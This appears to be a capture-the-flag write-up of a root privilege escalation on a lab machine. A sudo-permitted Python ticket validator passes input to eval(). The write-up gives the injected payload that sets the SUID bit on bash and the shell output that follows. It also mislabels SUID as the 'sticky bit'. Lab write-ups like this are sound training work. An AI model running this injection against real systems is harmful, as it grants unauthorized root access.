First things first, run *sudo -l* to see what this account can execute as root
```bash
development@bountyhunter:/opt/skytrain_inc$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```
Checking out the */opt/skytrain_inc/ticketValidator.py* script shows there is an eval() near the bottom of the file that accepts user input
![[Pasted image 20210806133807.png]]
Craft a ticket that will set the SUID bit for /usr/bin/bash
```python
# Skytrain Inc
## Ticket to 
__Ticket Code:__
**18+__import__('os').system('chmod u+s /usr/bin/bash')
```
Run the script with this ticket as root and check out /usr/bin/bash
```bash
development@bountyhunter:/opt/skytrain_inc$ ls -la /usr/bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /usr/bin/bash
```
Notice the sticky bit is now set -> Run */usr/bin/bash -p* to get a shell as root
```bash
development@bountyhunter:/opt/skytrain_inc$ /usr/bin/bash -p
bash-5.0# id
uid=1000(development) gid=1000(development) euid=0(root) groups=1000(development)
```